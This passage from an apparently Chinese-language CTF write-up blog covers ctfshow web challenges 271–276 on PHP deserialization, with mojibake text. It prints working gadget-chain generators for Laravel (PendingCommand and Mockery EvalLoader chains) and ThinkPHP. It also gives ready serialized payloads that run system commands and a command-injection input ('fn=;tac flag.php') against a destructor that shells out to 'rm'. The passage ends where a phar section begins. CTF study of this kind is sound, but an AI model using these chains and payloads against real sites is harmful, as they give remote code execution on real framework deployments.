<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Testing</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">PendingCommand</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">test</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$app</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$command</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$parameters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$test</span>, <span class="variable">$app</span>, <span class="variable">$command</span>, <span class="variable">$parameters</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;test = <span class="variable">$test</span>;                 <span class="comment">//ä¸€ä¸ªå®ä¾‹åŒ–çš„ç±» Illuminate\Auth\GenericUser</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;app = <span class="variable">$app</span>;                   <span class="comment">//ä¸€ä¸ªå®ä¾‹åŒ–çš„ç±» Illuminate\Foundation\Application</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;command = <span class="variable">$command</span>;           <span class="comment">//è¦æ‰§è¡Œçš„phpå‡½æ•° system</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;parameters = <span class="variable">$parameters</span>;     <span class="comment">//è¦æ‰§è¡Œçš„phpå‡½æ•°çš„å‚æ•°  array(&#x27;id&#x27;)</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">DefaultGenerator</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">default</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$default</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="keyword">default</span> = <span class="variable">$default</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Application</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">instances</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$instances</span> = []</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;instances[<span class="string">&#x27;Illuminate\Contracts\Console\Kernel&#x27;</span>] = <span class="variable">$instances</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title class_">defaultgenerator</span> = <span class="title class_">new</span> <span class="title class_">Faker</span>\<span class="title class_">DefaultGenerator</span>(<span class="title class_">array</span>(&quot;<span class="title class_">hello</span>&quot; =&gt; &quot;<span class="title class_">world</span>&quot;));</span><br><span class="line"></span><br><span class="line">    <span class="variable">$app</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Foundation\Application</span>();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$application</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Foundation\Application</span>(<span class="variable">$app</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$pendingcommand</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Foundation\Testing\PendingCommand</span>(<span class="variable">$defaultgenerator</span>, <span class="variable">$application</span>, <span class="string">&#x27;system&#x27;</span>, <span class="keyword">array</span>(<span class="string">&#x27;cat /flag&#x27;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$pendingcommand</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç›´æ¥<code>POST</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data=O%3A44%3A%22Illuminate%5CFoundation%5CTesting%5CPendingCommand%22%3A4%3A%7Bs%3A4%3A%22test%22%3BO%3A22%3A%22Faker%5CDefaultGenerator%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00default%22%3Ba%3A1%3A%7Bs%3A5%3A%22hello%22%3Bs%3A5%3A%22world%22%3B%7D%7Ds%3A6%3A%22%00%2A%00app%22%3BO%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3A1%3A%7Bs%3A12%3A%22%00%2A%00instances%22%3Ba%3A1%3A%7Bs%3A35%3A%22Illuminate%5CContracts%5CConsole%5CKernel%22%3BO%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3A1%3A%7Bs%3A12%3A%22%00%2A%00instances%22%3Ba%3A1%3A%7Bs%3A35%3A%22Illuminate%5CContracts%5CConsole%5CKernel%22%3Ba%3A0%3A%7B%7D%7D%7D%7D%7Ds%3A10%3A%22%00%2A%00command%22%3Bs%3A6%3A%22system%22%3Bs%3A13%3A%22%00%2A%00parameters%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7D%7D</span><br></pre></td></tr></table></figure>

<h2 id="web272-273"><a href="#web272-273" class="headerlink" title="web272-273"></a>web272-273</h2><p>ç”¨è¿™ä¸ªé“¾å­</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Author:monitor</span></span><br><span class="line"><span class="comment">description:</span></span><br><span class="line"><span class="comment">    laravel deserialization chain</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Broadcasting</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">PendingBroadcast</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">events</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$event</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$events</span>,<span class="variable">$event</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;events = <span class="variable">$events</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;event = <span class="variable">$event</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Bus</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Dispatcher</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">queueResolver</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$queueResolver</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;queueResolver = <span class="variable">$queueResolver</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Mockery</span>\<span class="title class_">Loader</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">EvalLoader</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">namespace</span> <span class="title class_">Mockery</span>\<span class="title class_">Generator</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">MockDefinition</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">config</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$code</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$config</span>,<span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;config = <span class="variable">$config</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;code = <span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MockConfiguration</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Queue</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">CallQueuedClosure</span>&#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">connection</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$connection</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;connection = <span class="variable">$connection</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span></span><br><span class="line">&#123;   </span><br><span class="line">    // <span class="title class_">if</span>($<span class="title class_">argc</span>&lt;2)&#123;</span><br><span class="line">    //     <span class="title class_">echo</span> &quot;<span class="title class_">Description</span>:\<span class="title class_">n</span>\<span class="title class_">tUse</span> <span class="title class_">laravel</span> <span class="title class_">deserialization</span> <span class="title class_">to</span> <span class="title class_">eval</span> <span class="title class_">php</span> <span class="title class_">code</span>,<span class="title class_">don</span>&#x27;<span class="title class_">t</span> <span class="title class_">need</span> <span class="title class_">to</span> <span class="title class_">input</span> <span class="title class_">php</span> <span class="title class_">tags</span>.&quot;;</span><br><span class="line">    <span class="comment">//     echo &quot;\nUsage:&quot; .$argv[0] . &quot; &lt;code&gt;&quot;;</span></span><br><span class="line">    <span class="comment">//     exit();</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="comment">// var_dump($argv[1]);</span></span><br><span class="line">    <span class="variable">$argv</span>[<span class="number">1</span>] = <span class="string">&quot;system(&#x27;cat\$IFS\$9/f*&#x27;);&quot;</span>;</span><br><span class="line">    <span class="comment">// $argv[1] = &quot;system(&#x27;cat$IFS$9/f*&#x27;);&quot;;</span></span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$argv</span>[<span class="number">1</span>];</span><br><span class="line">    <span class="variable">$mockconfiguration</span> = <span class="keyword">new</span> <span class="title class_">Mockery\Generator\MockConfiguration</span>(<span class="string">&quot;pass&quot;</span>);</span><br><span class="line">    <span class="variable">$mockdefination</span> = <span class="keyword">new</span> <span class="title class_">Mockery\Generator\MockDefinition</span>(<span class="variable">$mockconfiguration</span>,<span class="string">&quot;&lt;?php &quot;</span>.<span class="variable">$code</span>.<span class="string">&quot; exit;?&gt;&quot;</span>);</span><br><span class="line">    <span class="variable">$callqueuedclosure</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Queue\CallQueuedClosure</span>(<span class="variable">$mockdefination</span>);</span><br><span class="line">    <span class="variable">$evaload</span> = <span class="keyword">new</span> <span class="title class_">Mockery\Loader\EvalLoader</span>();</span><br><span class="line">    <span class="variable">$dispatcher</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Bus\Dispatcher</span>(<span class="keyword">array</span>(<span class="variable">$evaload</span>,<span class="string">&quot;load&quot;</span>));</span><br><span class="line">    <span class="variable">$pendingbroadcast</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Broadcasting\PendingBroadcast</span>(<span class="variable">$dispatcher</span>,<span class="variable">$callqueuedclosure</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$pendingbroadcast</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç›´æ¥<code>POST</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data=O%3A40%3A%22Illuminate%5CBroadcasting%5CPendingBroadcast%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00events%22%3BO%3A25%3A%22Illuminate%5CBus%5CDispatcher%22%3A1%3A%7Bs%3A16%3A%22%00%2A%00queueResolver%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A25%3A%22Mockery%5CLoader%5CEvalLoader%22%3A0%3A%7B%7Di%3A1%3Bs%3A4%3A%22load%22%3B%7D%7Ds%3A8%3A%22%00%2A%00event%22%3BO%3A34%3A%22Illuminate%5CQueue%5CCallQueuedClosure%22%3A1%3A%7Bs%3A10%3A%22connection%22%3BO%3A32%3A%22Mockery%5CGenerator%5CMockDefinition%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00config%22%3BO%3A35%3A%22Mockery%5CGenerator%5CMockConfiguration%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00name%22%3Bs%3A4%3A%22pass%22%3B%7Ds%3A7%3A%22%00%2A%00code%22%3Bs%3A37%3A%22%3C%3Fphp+system%28%27cat%24IFS%249%2Ff%2A%27%29%3B+exit%3B%3F%3E%22%3B%7D%7D%7D</span><br></pre></td></tr></table></figure>

<h2 id="web274"><a href="#web274" class="headerlink" title="web274"></a>web274</h2><p>æºç ä¸­å‘ç°</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- @unserialize(base64_decode(\$_GET[&#x27;data&#x27;]))--&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç”¨è¿™ä¸ªé“¾å­</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;append = [<span class="string">&quot;lin&quot;</span>=&gt;[<span class="string">&quot;calc.exe&quot;</span>,<span class="string">&quot;calc&quot;</span>]];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = [<span class="string">&quot;lin&quot;</span>=&gt;<span class="keyword">new</span> <span class="title class_">Request</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$hook</span> = [];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filter</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$config</span> = [</span><br><span class="line">        <span class="comment">// è¡¨å•ajaxä¼ªè£…å˜é‡</span></span><br><span class="line">        <span class="string">&#x27;var_ajax&#x27;</span>         =&gt; <span class="string">&#x27;_ajax&#x27;</span>,  </span><br><span class="line">    ];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filter = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config = [<span class="string">&quot;var_ajax&quot;</span>=&gt;<span class="string">&#x27;lin&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hook = [<span class="string">&quot;visible&quot;</span>=&gt;[<span class="variable language_">$this</span>,<span class="string">&quot;isAjax&quot;</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files=[<span class="keyword">new</span> <span class="title class_">Pivot</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç›´æ¥<code>GET</code>è®¿é—®</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?lin=cat /flag&amp;data=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czozOiJsaW4iO2E6Mjp7aTowO3M6ODoiY2FsYy5leGUiO2k6MTtzOjQ6ImNhbGMiO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czozOiJsaW4iO086MTM6InRoaW5rXFJlcXVlc3QiOjM6e3M6NzoiACoAaG9vayI7YToxOntzOjc6InZpc2libGUiO2E6Mjp7aTowO3I6OTtpOjE7czo2OiJpc0FqYXgiO319czo5OiIAKgBmaWx0ZXIiO3M6Njoic3lzdGVtIjtzOjk6IgAqAGNvbmZpZyI7YToxOntzOjg6InZhcl9hamF4IjtzOjM6ImxpbiI7fX19fX19</span><br></pre></td></tr></table></figure>

<h2 id="web275"><a href="#web275" class="headerlink" title="web275"></a>web275</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">filter</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filecontent</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$evilfile</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$fn</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename=<span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filecontent=<span class="variable">$fn</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkevil</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/php|\.\./i&#x27;</span>, <span class="variable">$this</span>-&gt;filename))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="variable">$this</span>-&gt;filecontent))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;evilfile;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;evilfile)&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm &#x27;</span>.<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    <span class="variable">$f</span> = <span class="keyword">new</span> <span class="title function_ invoke__">filter</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],<span class="variable">$content</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">checkevil</span>()===<span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line">        <span class="title function_ invoke__">copy</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>()).<span class="string">&#x27;.txt&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>].<span class="string">&#x27;/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;work done&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;where is flag?&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ææ„å‡½æ•°é‡Œå¯ä»¥ç›´æ¥å‘½ä»¤æ‰§è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?fn=;tac flag.php</span><br><span class="line">POSTï¼š</span><br><span class="line">flag=123</span><br></pre></td></tr></table></figure>

<h2 id="web276"><a href="#web276" class="headerlink" title="web276"></a>web276</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">filter</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filecontent</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$evilfile</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$admin</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$fn</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename=<span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filecontent=<span class="variable">$fn</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkevil</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/php|\.\./i&#x27;</span>, <span class="variable">$this</span>-&gt;filename))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="variable">$this</span>-&gt;filecontent))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;evilfile;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;evilfile &amp;&amp; <span class="variable language_">$this</span>-&gt;admin)&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm &#x27;</span>.<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    <span class="variable">$f</span> = <span class="keyword">new</span> <span class="title function_ invoke__">filter</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],<span class="variable">$content</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">checkevil</span>()===<span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line">        <span class="title function_ invoke__">copy</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>()).<span class="string">&#x27;.txt&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>].<span class="string">&#x27;/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;work done&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;where is flag?&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…³é”®ç‚¹åœ¨äº<code>file_put_contents</code>å‡½æ•°ï¼Œåœ¨è¿™é‡Œå¯ä»¥ä½¿ç”¨<code>phar</code>ååºåˆ—åŒ–ã€‚å› ä¸º<code>copy</code>ä¼šè€—è´¹æ—¶é—´ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨æ¡ä»¶ç«äº‰åœ¨æ–‡ä»¶è¢«åˆ é™¤ä¹‹å‰è¯»å–åˆ©ç”¨ã€‚</p>
<p><strong>phar.php</strong></p>
